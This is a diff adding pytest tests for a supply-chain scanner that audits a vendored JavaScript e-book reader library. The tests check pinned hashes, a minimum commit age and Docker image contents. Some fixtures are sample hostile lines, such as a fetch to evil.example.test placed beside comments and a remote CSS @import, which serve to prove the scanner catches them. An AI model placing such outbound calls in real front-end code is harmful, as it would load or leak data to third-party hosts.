@@ -5,8 +5,10 @@ tracks (one gitlink), what `docs/dependencies.md` documents (the same commit), w
 what the reader loads at run time (nothing from a third-party origin) are tied together here.
 """
 
+import fnmatch
 import re
 import subprocess
+from datetime import UTC, datetime
 from pathlib import Path
 
 import pytest
@@ -467,3 +469,175 @@ def test_audit_has_a_row_for_every_script_of_the_library() -> None:
     scripts -= {"eslint.config.js", "rollup.config.js"}  # build files, never run
     for name in sorted(scripts):
         assert f"`{name}`" in body, f"audit has no row for {name}"
+
+
+# --- review #370 and decisions of the owner ------------------------------------------------------
+
+
+@pytest.mark.req("EF-LEC-003", "ENF-SEC-004")
+@pytest.mark.parametrize(
+    "code",
+    [
+        '/**/ fetch("https://evil.example.test/x")',
+        '/* a */ /* b */ fetch("https://evil.example.test/x")',
+        'const a = 1 /* x */; fetch("https://evil.example.test/x") // tail',
+        "const re = /['\"]/g; fetch('https://evil.example.test/x')",  # a quote in a regex
+    ],
+)
+def test_comments_are_removed_but_the_code_next_to_them_is_scanned(
+    tmp_path: Path, code: str
+) -> None:
+    _vendored(tmp_path, **{"newfile.js": code + "\n"})
+    problems = pin.asset_problems(tmp_path)
+    assert any("fetch" in p for p in problems), problems
+    assert any("evil.example.test" in p for p in problems), problems
+
+
+@pytest.mark.req("EF-LEC-003")
+def test_the_tokenizer_keeps_strings_and_drops_only_comments() -> None:
+    assert pin._code("a = 'http://x' // c\nb") == "a = 'http://x' \nb"
+    assert pin._code("a /* c */ b").split() == ["a", "b"]
+    assert "evil" not in pin._code("// evil\n/* evil */")
+    assert pin._code("x = `/* in a template */ y`").replace("  ", " ") == "x = ` y`"
+    assert pin._code("@import url(http://h/x.css); /* c */", css=True).startswith(
+        "@import url(http"
+    )
+
+
+@pytest.mark.req("EF-LEC-003", "ENF-SEC-004")
+@pytest.mark.parametrize(
+    "code",
+    [
+        "configure({ useWebWorkers: true })",
+        "configure({ useWebWorkers: false })\nconfigure({ useWebWorkers: true })",
+        "configure({ useWebWorkers: false })\nconfigure(opts)",
+        "configure({ useWebWorkers: false })\nconst o = { useWebWorkers: true }",
+        "configure({ useWebWorkers: false, workerURI: u })",
+    ],
+)
+def test_zip_workers_can_never_be_turned_back_on(tmp_path: Path, code: str) -> None:
+    _vendored(tmp_path, **{"view.js": code + "\n"})
+    assert any("useWebWorkers" in p or "configure" in p for p in pin.asset_problems(tmp_path))
+
+
+@pytest.mark.req("EF-LEC-003", "ENF-SEC-004")
+def test_static_imports_are_inventoried_like_dynamic_ones(tmp_path: Path) -> None:
+    _vendored(tmp_path, **{"newfile.js": "import { a } from './other.js'\n"})
+    assert any("import-from" in p for p in pin.asset_problems(tmp_path))
+
+
+@pytest.mark.req("EF-LEC-003", "ENF-SEC-004")
+def test_every_file_of_vendor_is_pinned_and_the_manifest_is_complete() -> None:
+    manifest = pin._manifest(REPO)
+    base = REPO / SUBMODULE
+    if not (base / "view.js").exists():
+        pytest.skip("submodule not checked out in this job")
+    assert pin.vendor_digests(base) == manifest
+    assert len(manifest) > 100
+    assert all(re.fullmatch(r"[0-9a-f]{64}", d) for d in manifest.values())
+
+
+@pytest.mark.req("EF-LEC-003", "ENF-SEC-004")
+def test_a_remote_import_in_a_vendored_stylesheet_is_flagged_even_if_pinned(
+    tmp_path: Path,
+) -> None:
+    base = _vendored(tmp_path)
+    (base / "vendor").mkdir()
+    (base / "vendor" / "x.css").write_text("@import url(https://evil.example.test/x.css);")
+    manifest = tmp_path / "tools"
+    manifest.mkdir()
+    digest = pin.vendor_digests(base)["vendor/x.css"]
+    (manifest / "foliate-vendor.sha256").write_text(f"{digest}  vendor/x.css\n")
+    problems = pin.asset_problems(tmp_path)
+    assert any("x.css" in p and "third-party" in p for p in problems), problems
+
+
+def _aged_repo(tmp_path: Path, committed: str) -> Path:
+    """A repository whose gitlink is a nested-repository commit dated `committed`."""
+    sub = tmp_path / SUBMODULE
+    sub.mkdir(parents=True)
+    env = {
+        "GIT_COMMITTER_DATE": committed,
+        "GIT_AUTHOR_DATE": committed,
+        "GIT_CONFIG_GLOBAL": "/dev/null",
+        "GIT_CONFIG_SYSTEM": "/dev/null",
+        "PATH": "/usr/bin:/bin",
+    }
+    ident = ["-c", "user.name=t", "-c", "user.email=t@example.test"]
+    for args in (["init", "-q"], [*ident, "commit", "-q", "--allow-empty", "-m", "x"]):
+        subprocess.run(  # noqa: S603
+            ["git", "-C", str(sub), *args],  # noqa: S607
+            check=True,
+            capture_output=True,
+            env=env,
+        )
+    sha = subprocess.run(  # noqa: S603
+        ["git", "-C", str(sub), "rev-parse", "HEAD"],  # noqa: S607
+        check=True,
+        capture_output=True,
+        text=True,
+    ).stdout.strip()
+    _git(tmp_path, "init", "-q")
+    _git(tmp_path, "update-index", "--add", "--cacheinfo", f"160000,{sha},{SUBMODULE}")
+    return tmp_path
+
+
+@pytest.mark.req("EF-LEC-003")
+def test_min_age_refuses_a_pinned_commit_younger_than_the_cooldown(tmp_path: Path) -> None:
+    root = _aged_repo(tmp_path, "2026-11-10T12:00:00+00:00")
+    now = datetime(2026, 11, 18, tzinfo=UTC)
+    assert pin.min_age_problems(root, 14, now=now), "8 days old, 14 required"
+    assert pin.min_age_problems(root, 7, now=now) == []
+    assert pin.min_age_problems(root, 14, now=datetime(2026, 11, 24, 13, tzinfo=UTC)) == []
+
+
+@pytest.mark.req("EF-LEC-003")
+def test_min_age_refuses_when_the_submodule_is_not_checked_out(tmp_path: Path) -> None:
+    root = _repo(tmp_path)
+    assert pin.min_age_problems(root, 14)
+
+
+@pytest.mark.req("EF-LEC-003")
+def test_ci_checks_the_age_of_the_pinned_commit_where_the_submodule_is_checked_out() -> None:
+    frontend = " ".join(str(s.get("run", "")) for s in _steps(_jobs("ci.yml")["frontend"]))
+    assert "check_submodule_pin.py pin --min-age 14" in frontend
+
+
+# --- the image never carries pdf.js --------------------------------------------------------------
+
+
+def _docker_excluded(path: str) -> bool:
+    """`.dockerignore` semantics: patterns in order, the last that matches decides."""
+    excluded = False
+    for raw in (REPO / ".dockerignore").read_text(encoding="utf-8").splitlines():
+        line = raw.strip()
+        if not line or line.startswith("#"):
+            continue
+        negate = line.startswith("!")
+        pattern = line.lstrip("!").rstrip("/")
+        parts = path.split("/")
+        prefixes = ["/".join(parts[: i + 1]) for i in range(len(parts))]
+        if pattern == "*" or any(fnmatch.fnmatchcase(p, pattern) for p in prefixes):
+            excluded = not negate
+    return excluded
+
+
+@pytest.mark.req("EF-LEC-003")
+def test_the_image_does_not_contain_pdfjs() -> None:
+    pdfjs = [
+        f"frontend/{rel.partition('  ')[2]}".replace("frontend/vendor/", f"{SUBMODULE}/vendor/")
+        for rel in (REPO / "tools" / "foliate-vendor.sha256").read_text().splitlines()
+        if "/pdfjs/" in rel
+    ]
+    assert len(pdfjs) > 100
+    assert all(_docker_excluded(path) for path in pdfjs)
+    for kept in ("epub.js", "view.js", "paginator.js", "vendor/zip.js", "vendor/fflate.js"):
+        assert not _docker_excluded(f"{SUBMODULE}/{kept}"), kept
+    assert _docker_excluded(f"{SUBMODULE}/tests/tests.js")
+    # and the runtime image takes the static build only, never the sources of the frontend
+    dockerfile = (REPO / "docker" / "Dockerfile").read_text(encoding="utf-8")
+    copies = re.findall(r"^COPY .*frontend.*$", dockerfile, re.M)
+    assert [c for c in copies if "/app/frontend/build" in c] == [
+        "COPY --from=frontend-build /app/frontend/build /"
+    ]
+    assert not any("vendor" in c for c in copies)
